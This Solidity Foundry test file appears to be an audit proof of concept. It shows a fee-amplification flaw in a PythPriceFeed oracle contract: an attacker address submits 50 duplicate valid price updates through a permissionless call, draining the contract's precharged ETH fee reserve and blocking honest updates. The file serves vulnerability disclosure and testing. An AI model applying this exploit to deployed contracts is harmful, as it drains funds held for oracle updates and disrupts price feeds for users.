// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

import {Test} from "forge-std/Test.sol";

import {PythPriceFeed} from "../../oracles/updatable/PythPriceFeed.sol";
import {PythStructs} from "../../interfaces/pyth/PythStructs.sol";

/// @dev Models the relevant semantics of Pyth's production EVM contract:
///      fees are charged for every update in attacker-supplied updateData, while
///      stale/duplicate valid updates are accepted but do not replace newer state.
contract FeeChargingPythMock {
    uint256 public constant FEE_PER_UPDATE = 4e12; // Current Ethereum fee: 0.000004 ETH.

    mapping(bytes32 priceFeedId => PythStructs.Price price) internal _prices;

    function getUpdateFee(bytes[] calldata updateData) external pure returns (uint256) {
        return updateData.length * FEE_PER_UPDATE;
    }

    function updatePriceFeeds(bytes[] calldata updateData) external payable {
        require(msg.value >= updateData.length * FEE_PER_UPDATE, "insufficient fee");

        for (uint256 i; i < updateData.length; ++i) {
            (int64 price, uint64 conf, int32 expo, uint256 publishTime, bytes32 priceFeedId) =
                abi.decode(updateData[i], (int64, uint64, int32, uint256, bytes32));

            if (publishTime > _prices[priceFeedId].publishTime) {
                _prices[priceFeedId] = PythStructs.Price({
                    price: price,
                    conf: conf,
                    expo: expo,
                    publishTime: publishTime
                });
            }
        }
    }

    function getPriceUnsafe(bytes32 priceFeedId) external view returns (PythStructs.Price memory) {
        return _prices[priceFeedId];
    }

    function latestPriceInfoPublishTime(bytes32 priceFeedId) external view returns (uint64) {
        return uint64(_prices[priceFeedId].publishTime);
    }
}

contract PythPriceFeedFeeAmplificationPoC is Test {
    bytes32 internal constant PRICE_FEED_ID = keccak256("GBX/USD");
    address internal constant TOKEN = address(0xBEEF);
    address internal constant ATTACKER = address(0xA11CE);
    uint256 internal constant NUM_DUPLICATE_UPDATES = 50;

    FeeChargingPythMock internal pyth;
    PythPriceFeed internal priceFeed;

    function setUp() public {
        pyth = new FeeChargingPythMock();
        priceFeed = new PythPriceFeed(TOKEN, PRICE_FEED_ID, address(pyth), 5_000, "GBX / USD");
    }

    function test_PermissionlessCallerCanConsumeEntirePrechargedBalanceWithDuplicateUpdates() public {
        uint256 prechargedBalance = NUM_DUPLICATE_UPDATES * pyth.FEE_PER_UPDATE();
        vm.deal(address(priceFeed), prechargedBalance);

        bytes memory validUpdate = _update(block.timestamp);
        bytes[] memory attackerData = new bytes[](NUM_DUPLICATE_UPDATES);
        for (uint256 i; i < NUM_DUPLICATE_UPDATES; ++i) {
            attackerData[i] = validUpdate;
        }

        vm.prank(ATTACKER);
        priceFeed.updatePrice(abi.encode(block.timestamp, attackerData));

        assertEq(address(priceFeed).balance, 0, "attacker should consume the full fee reserve");
        assertEq(address(pyth).balance, prechargedBalance, "all reserved ETH is paid as update fees");
        assertEq(
            pyth.latestPriceInfoPublishTime(PRICE_FEED_ID),
            block.timestamp,
            "one valid target update is enough for Gearbox's post-check"
        );

        vm.warp(block.timestamp + 1);
        bytes[] memory honestData = new bytes[](1);
        honestData[0] = _update(block.timestamp);

        vm.prank(address(0xB0B));
        vm.expectRevert();
        priceFeed.updatePrice(abi.encode(block.timestamp, honestData));
    }

    function test_Control_SingleTargetUpdateConsumesOnlyOneFee() public {
        uint256 oneFee = pyth.FEE_PER_UPDATE();
        vm.deal(address(priceFeed), oneFee);

        bytes[] memory honestData = new bytes[](1);
        honestData[0] = _update(block.timestamp);
        priceFeed.updatePrice(abi.encode(block.timestamp, honestData));

        assertEq(address(pyth).balance, oneFee);
    }

    function _update(uint256 publishTime) internal pure returns (bytes memory) {
        return abi.encode(int64(1e8), uint64(1), int32(-8), publishTime, PRICE_FEED_ID);
    }
}
